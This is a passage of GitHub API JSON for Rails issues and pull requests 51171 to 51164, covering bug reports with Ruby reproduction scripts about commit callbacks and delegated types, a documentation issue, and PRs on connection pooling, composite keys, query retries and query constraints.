        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51172/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51171",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51171/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51171/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51171/events",
        "html_url": "https://github.com/rails/rails/issues/51171",
        "id": 2149821824,
        "node_id": "I_kwDNIULOgCOtgA",
        "number": 51171,
        "title": "If you set after_destroy_commit && after_create_commit calling the same method. Only one fires.",
        "user": {
            "login": "ConfusedVorlon",
            "id": 586910,
            "node_id": "MDQ6VXNlcjU4NjkxMA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/586910?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/ConfusedVorlon",
            "html_url": "https://github.com/ConfusedVorlon",
            "followers_url": "https://api.github.com/users/ConfusedVorlon/followers",
            "following_url": "https://api.github.com/users/ConfusedVorlon/following{/other_user}",
            "gists_url": "https://api.github.com/users/ConfusedVorlon/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/ConfusedVorlon/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/ConfusedVorlon/subscriptions",
            "organizations_url": "https://api.github.com/users/ConfusedVorlon/orgs",
            "repos_url": "https://api.github.com/users/ConfusedVorlon/repos",
            "events_url": "https://api.github.com/users/ConfusedVorlon/events{/privacy}",
            "received_events_url": "https://api.github.com/users/ConfusedVorlon/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-22T19:45:44Z",
        "updated_at": "2024-02-23T19:58:17Z",
        "closed_at": "2024-02-22T20:17:17Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\nhave `after_destroy_commit` and `after_create_commit` callbacks calling the same method\r\n\r\n```\r\n    after_destroy_commit :increment_count\r\n    after_create_commit :increment_count\r\n```\r\n\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  gem \"rails\"\r\n  # If you want to test against edge Rails replace the previous line with this:\r\n  # gem \"rails\", github: \"rails/rails\", branch: \"main\"\r\n\r\n  gem \"sqlite3\"\r\nend\r\n\r\nrequire \"active_record\"\r\nrequire \"minitest/autorun\"\r\nrequire \"logger\"\r\n\r\n# This connection will do for database-independent bug reports.\r\nActiveRecord::Base.establish_connection(adapter: \"sqlite3\", database: \":memory:\")\r\nActiveRecord::Base.logger = Logger.new(STDOUT)\r\n\r\nActiveRecord::Schema.define do\r\n  create_table :foos, force: true do |t|\r\n  end\r\n\r\n  create_table :bars, force: true do |t|\r\n  end\r\n  \r\n  create_table :counters, force: true do |t|\r\n      t.integer :count, default: 0\r\n  end\r\nend\r\n\r\nclass Foo < ActiveRecord::Base\r\n    \r\n    after_destroy_commit :increment_count\r\n    after_create_commit :increment_count\r\n        \r\n    def increment_count\r\n      counter = Counter.first\r\n      counter.count = counter.count + 1\r\n      counter.save\r\n    end\r\nend\r\n\r\nclass Bar < ActiveRecord::Base\r\n    \r\n    after_destroy_commit :increment_count_a\r\n    after_create_commit :increment_count_b\r\n        \r\n\r\n    def increment_count_a\r\n      counter = Counter.first\r\n      counter.count = counter.count + 1\r\n      counter.save\r\n    end\r\n        \r\n    def increment_count_b\r\n      counter = Counter.first\r\n      counter.count = counter.count + 1\r\n      counter.save\r\n    end\r\nend\r\n\r\nclass Counter < ActiveRecord::Base\r\n\r\nend\r\n\r\n\r\nclass BugTest < Minitest::Test\r\n    \r\n  def test_callbacks_on_shared_method\r\n      \r\n    counter = Counter.create!\r\n      \r\n    assert_equal 0, counter.reload.count\r\n    \r\n    foo = Foo.create!\r\n\r\n    assert_equal 1, counter.reload.count\r\n    \r\n    foo.destroy\r\n    \r\n    assert_equal 2, counter.reload.count\r\n  end\r\n\r\n  #Just for good measure - passing test where the only difference is that callbacks call different methods\r\n  def test_callbacks_on_different_method\r\n      \r\n    counter = Counter.create!\r\n      \r\n    assert_equal 0, counter.reload.count\r\n    \r\n    bar = Bar.create!\r\n\r\n    assert_equal 1, counter.reload.count\r\n    \r\n    bar.destroy\r\n    \r\n    assert_equal 2, counter.reload.count\r\n  end\r\n\r\nend\r\n\r\n```\r\n\r\n### Expected behavior\r\n\r\nBoth callbacks fire\r\n\r\n### Actual behavior\r\n\r\nOnly the second callback fires `after_create_commit` in this example\r\n\r\nThe root of this seems to be that both callbacks are aliases for after_commit - which then presumably uses the called method as a key in some way.\r\nHowever, this conflict is both surprising - and (as far as I can tell) not warned about in the docs. \r\n\r\n### System configuration\r\n**Rails version**:\r\n\r\nInstalling rails 7.1.3.2\r\n\r\n**Ruby version**:\r\n3.3.0",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51171/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51171/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51170",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51170/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51170/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51170/events",
        "html_url": "https://github.com/rails/rails/issues/51170",
        "id": 2149753842,
        "node_id": "I_kwDNIULOgCKj8g",
        "number": 51170,
        "title": "Updating delegated types using delegate type attributes produces orphaned children",
        "user": {
            "login": "SteveKhuu",
            "id": 2601735,
            "node_id": "MDQ6VXNlcjI2MDE3MzU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2601735?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/SteveKhuu",
            "html_url": "https://github.com/SteveKhuu",
            "followers_url": "https://api.github.com/users/SteveKhuu/followers",
            "following_url": "https://api.github.com/users/SteveKhuu/following{/other_user}",
            "gists_url": "https://api.github.com/users/SteveKhuu/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/SteveKhuu/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/SteveKhuu/subscriptions",
            "organizations_url": "https://api.github.com/users/SteveKhuu/orgs",
            "repos_url": "https://api.github.com/users/SteveKhuu/repos",
            "events_url": "https://api.github.com/users/SteveKhuu/events{/privacy}",
            "received_events_url": "https://api.github.com/users/SteveKhuu/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 6,
        "created_at": "2024-02-22T19:04:11Z",
        "updated_at": "2024-02-25T21:09:53Z",
        "closed_at": "2024-02-25T21:09:53Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n```ruby\r\nrequire 'bundler/inline'\r\n\r\ngemfile(true) do\r\n  source 'https://rubygems.org'\r\n\r\n  gem 'rails', '~> 7'\r\n  gem 'sqlite3', platform: :mri\r\nend\r\n\r\nrequire 'active_record'\r\nrequire 'minitest/autorun'\r\n\r\nActiveRecord::Base.establish_connection(adapter: 'sqlite3', database: ':memory:')\r\nActiveRecord::Base.logger = Logger.new(STDOUT)\r\n\r\nActiveRecord::Schema.define do\r\n  create_table :products do |t|\r\n    t.references :purchasable, polymorphic: true\r\n    t.text :name\r\n\r\n    t.timestamps\r\n  end\r\n\r\n  create_table :digital_goods do |t|\r\n    t.boolean :drm_free\r\n\r\n    t.timestamps\r\n  end\r\n\r\n  create_table :physical_goods do |t|\r\n    t.decimal :weight\r\n\r\n    t.timestamps\r\n  end\r\nend\r\n\r\nclass ApplicationRecord < ActiveRecord::Base\r\n  self.abstract_class = true\r\nend\r\n\r\nclass Product < ApplicationRecord\r\n  delegated_type :purchasable, types: %w[DigitalGood PhysicalGood]\r\n\r\n  accepts_nested_attributes_for :purchasable\r\nend\r\n\r\nclass DigitalGood < ApplicationRecord\r\n  has_one :product, as: :purchasable, touch: true\r\nend\r\n\r\nclass PhysicalGood < ApplicationRecord\r\n  has_one :product, as: :purchasable, touch: true\r\nend\r\n\r\nclass BugTest < Minitest::Test\r\n  def setup\r\n    Product.destroy_all\r\n    PhysicalGood.destroy_all\r\n    DigitalGood.destroy_all\r\n  end\r\n\r\n  def test_delegated_type_update\r\n    Product.create({ name: 'CD', purchasable_type: 'PhysicalGood', purchasable_attributes: { weight: 0.1 } })\r\n    Product.create({ name: 'Video', purchasable_type: 'DigitalGood', purchasable_attributes: { drm_free: true } })\r\n\r\n    Product.last.purchasable.update({ drm_free: false })\r\n\r\n    assert_equal 2, Product.count\r\n    assert_equal 1, PhysicalGood.count\r\n    assert_equal 1, DigitalGood.count\r\n  end\r\n\r\n  def test_delegated_type_update_with_purchasable_attributes\r\n    Product.create({ name: 'CD', purchasable_type: 'PhysicalGood', purchasable_attributes: { weight: 0.1 } })\r\n    Product.create({ name: 'Video', purchasable_type: 'DigitalGood', purchasable_attributes: { drm_free: true } })\r\n\r\n    Product.last.update({ purchasable_attributes: { drm_free: false } })\r\n\r\n    assert_equal 2, Product.count\r\n    assert_equal 1, PhysicalGood.count\r\n    assert_equal 1, DigitalGood.count #a child gets orphaned here.\r\n  end\r\nend\r\n\r\n```\r\n\r\n### Expected behavior\r\nIn the same way we created records using the parent class, we expected to be able to update the associated child delegate type record as well. \r\ni.e. both of our test examples should be passing.\r\n\r\n### Actual behavior\r\nWhen the delegate_type attributes (e.g. `purchasable_attributes`) are used in the update call, a new child delegate type record will be created and the parent will update its foreign key reference to the new child. This leaves an orphaned record in the child table.\r\ni.e. as a result, our `test_delegated_type_update_with_purchasable_attributes` test fails because the number of child records (namely `DigitalGood`) has changed.\r\n\r\n### System configuration\r\n**Rails version**: Rails 7.1.3.2\r\n\r\n**Ruby version**: ruby 3.1.2p20 (2022-04-12 revision 4491bb740a) [arm64-darwin22]\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51170/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51170/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51169",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51169/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51169/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51169/events",
        "html_url": "https://github.com/rails/rails/issues/51169",
        "id": 2149439059,
        "node_id": "I_kwDNIULOgB3WUw",
        "number": 51169,
        "title": "Docs: ActiveRecord validations - Skipping Validations fails to mention callbacks/timestamps in some cases",
        "user": {
            "login": "Earlopain",
            "id": 14981592,
            "node_id": "MDQ6VXNlcjE0OTgxNTky",
            "avatar_url": "https://avatars.githubusercontent.com/u/14981592?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Earlopain",
            "html_url": "https://github.com/Earlopain",
            "followers_url": "https://api.github.com/users/Earlopain/followers",
            "following_url": "https://api.github.com/users/Earlopain/following{/other_user}",
            "gists_url": "https://api.github.com/users/Earlopain/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Earlopain/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Earlopain/subscriptions",
            "organizations_url": "https://api.github.com/users/Earlopain/orgs",
            "repos_url": "https://api.github.com/users/Earlopain/repos",
            "events_url": "https://api.github.com/users/Earlopain/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Earlopain/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-22T16:19:12Z",
        "updated_at": "2024-02-24T17:28:44Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\nhttps://guides.rubyonrails.org/active_record_validations.html#skipping-validations lists a bunch of methods that skip validations. One of these is `update_columns`, which in addition to skipping validations also skips callbacks and doesn't update timestamps. This is explained in the method doc at https://api.rubyonrails.org/classes/ActiveRecord/Persistence.html#method-i-update_columns but should also be mentioned there.\r\n\r\nOther listed methods likely do something similar.\r\n\r\n### Expected behavior\r\nDocs should mention what other consequences there are to using these methods apart from just skipping validations. Might be fine to just put this as a general note, urging the user to look up the docs for the method they are intersted in using.\r\n Maybe method docs can be linked to directly from the list instead of just using method name code blocks?",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51169/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51169/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51168",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51168/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51168/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51168/events",
        "html_url": "https://github.com/rails/rails/pull/51168",
        "id": 2149395578,
        "node_id": "PR_kwDNIULOZ6oxrw",
        "number": 51168,
        "title": "ConnectionPool: handle schema_reflection being re-assigned",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-22T15:59:49Z",
        "updated_at": "2024-02-22T21:28:48Z",
        "closed_at": "2024-02-22T21:28:48Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51168",
            "html_url": "https://github.com/rails/rails/pull/51168",
            "diff_url": "https://github.com/rails/rails/pull/51168.diff",
            "patch_url": "https://github.com/rails/rails/pull/51168.patch",
            "merged_at": "2024-02-22T21:28:48Z"
        },
        "body": "This fixes a regression recently introduced that a schema_reflection assignment from taking effect.\r\n\r\nFYI @jenshenny ",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51168/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51168/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51167",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51167/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51167/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51167/events",
        "html_url": "https://github.com/rails/rails/pull/51167",
        "id": 2149370240,
        "node_id": "PR_kwDNIULOZ6nZLg",
        "number": 51167,
        "title": "[Fix #51129] Fix issue with IDs reader on preloaded associations for composite primary keys",
        "user": {
            "login": "Jay0921",
            "id": 12777550,
            "node_id": "MDQ6VXNlcjEyNzc3NTUw",
            "avatar_url": "https://avatars.githubusercontent.com/u/12777550?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Jay0921",
            "html_url": "https://github.com/Jay0921",
            "followers_url": "https://api.github.com/users/Jay0921/followers",
            "following_url": "https://api.github.com/users/Jay0921/following{/other_user}",
            "gists_url": "https://api.github.com/users/Jay0921/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Jay0921/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Jay0921/subscriptions",
            "organizations_url": "https://api.github.com/users/Jay0921/orgs",
            "repos_url": "https://api.github.com/users/Jay0921/repos",
            "events_url": "https://api.github.com/users/Jay0921/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Jay0921/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-22T15:46:48Z",
        "updated_at": "2024-02-25T07:42:08Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51167",
            "html_url": "https://github.com/rails/rails/pull/51167",
            "diff_url": "https://github.com/rails/rails/pull/51167.diff",
            "patch_url": "https://github.com/rails/rails/pull/51167.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nFixes https://github.com/rails/rails/issues/51129.\r\n\r\n### Detail\r\n\r\nWhen using composite primary keys in a model, the `primary_key` will be an array. This raises an issue when calling the `<association>_ids` method on a preloaded association. Internally, Rails uses the `pluck` method from Enumerable to retrieve the preloaded results. However, the `pluck` method does not accept an array as its argument. To accommodate that, we need to use the splat operator to split the array into multiple arguments dynamically.\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51167/reactions",
            "total_count": 1,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 1,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51167/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51166",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51166/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51166/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51166/events",
        "html_url": "https://github.com/rails/rails/pull/51166",
        "id": 2149321591,
        "node_id": "PR_kwDNIULOZ6kvtA",
        "number": 51166,
        "title": "Retry SELECT queries on connection-related exceptions",
        "user": {
            "login": "adrianna-chang-shopify",
            "id": 22918438,
            "node_id": "MDQ6VXNlcjIyOTE4NDM4",
            "avatar_url": "https://avatars.githubusercontent.com/u/22918438?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/adrianna-chang-shopify",
            "html_url": "https://github.com/adrianna-chang-shopify",
            "followers_url": "https://api.github.com/users/adrianna-chang-shopify/followers",
            "following_url": "https://api.github.com/users/adrianna-chang-shopify/following{/other_user}",
            "gists_url": "https://api.github.com/users/adrianna-chang-shopify/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/adrianna-chang-shopify/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/adrianna-chang-shopify/subscriptions",
            "organizations_url": "https://api.github.com/users/adrianna-chang-shopify/orgs",
            "repos_url": "https://api.github.com/users/adrianna-chang-shopify/repos",
            "events_url": "https://api.github.com/users/adrianna-chang-shopify/events{/privacy}",
            "received_events_url": "https://api.github.com/users/adrianna-chang-shopify/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 6,
        "created_at": "2024-02-22T15:23:29Z",
        "updated_at": "2024-02-28T06:45:17Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51166",
            "html_url": "https://github.com/rails/rails/pull/51166",
            "diff_url": "https://github.com/rails/rails/pull/51166.diff",
            "patch_url": "https://github.com/rails/rails/pull/51166.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nSELECT queries are idempotent and thus safe to retry automatically. This commit leverages `allow_retry` to enable automatic retries on queries that go through `ActiveRecord::ConnectionAdaptersDatabaseStatements#select`.\r\n\r\nThis should help with connection-related exceptions stemming from network issues. Notably, at Shopify, our applications have been encountering sporadic `Trilogy::EOFError` exceptions on finds / relation loads. \r\n\r\n### Detail\r\n\r\nPass `allow_retry: true` when calling `#internal_exec_query` from `ActiveRecord::ConnectionAdaptersDatabaseStatements#select`.\r\n\r\n### Additional information\r\n\r\nThere was discussion around retrying UPDATE and DELETE queries as well. This is potentially still valuable, though most Active Record updates and deletes are wrapped inside transactions that are retry-able anyways. Retrying `SELECT` queries will make a far more significant difference, so we're proposing we start by making these queries retry-able.\r\n\r\nWe'd also like to make the case to backport this to `7-1-stable`: some of Shopify's Rails applications are having trouble moving to trilogy because connection-related exceptions have been popping up, and the DB adapter hasn't been able to retry + reconnect. It's unclear why Trilogy in particular is experiencing these issues, but Trilogy is not usable for some of our applications without these changes. Making this available in the next patch release would help.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [X] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [X] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [X] Tests are added or updated if you fix a bug or add a feature.\r\n* [X] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51166/reactions",
            "total_count": 1,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 1,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51166/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51165",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51165/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51165/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51165/events",
        "html_url": "https://github.com/rails/rails/pull/51165",
        "id": 2149151621,
        "node_id": "PR_kwDNIULOZ6bZig",
        "number": 51165,
        "title": "[Fix #51164] `Model.query_constraints` with single non-primary-key column raises incorrect error",
        "user": {
            "login": "joshuay03",
            "id": 54629302,
            "node_id": "MDQ6VXNlcjU0NjI5MzAy",
            "avatar_url": "https://avatars.githubusercontent.com/u/54629302?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/joshuay03",
            "html_url": "https://github.com/joshuay03",
            "followers_url": "https://api.github.com/users/joshuay03/followers",
            "following_url": "https://api.github.com/users/joshuay03/following{/other_user}",
            "gists_url": "https://api.github.com/users/joshuay03/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/joshuay03/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/joshuay03/subscriptions",
            "organizations_url": "https://api.github.com/users/joshuay03/orgs",
            "repos_url": "https://api.github.com/users/joshuay03/repos",
            "events_url": "https://api.github.com/users/joshuay03/events{/privacy}",
            "received_events_url": "https://api.github.com/users/joshuay03/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-22T14:04:49Z",
        "updated_at": "2024-02-28T04:40:39Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51165",
            "html_url": "https://github.com/rails/rails/pull/51165",
            "diff_url": "https://github.com/rails/rails/pull/51165.diff",
            "patch_url": "https://github.com/rails/rails/pull/51165.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nFixes #51164.\r\n\r\n### Detail\r\n\r\nThis Pull Request changes `ActiveRecord::Reflection::AssociationReflection#derive_fk_query_constraints` to raise an existing more appropriate error if `Model.query_constraints` is given a single non-primary-key column argument.\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51165/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51165/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51164",
        "repository_url": "https://api.github.com/repos/rails/rails",
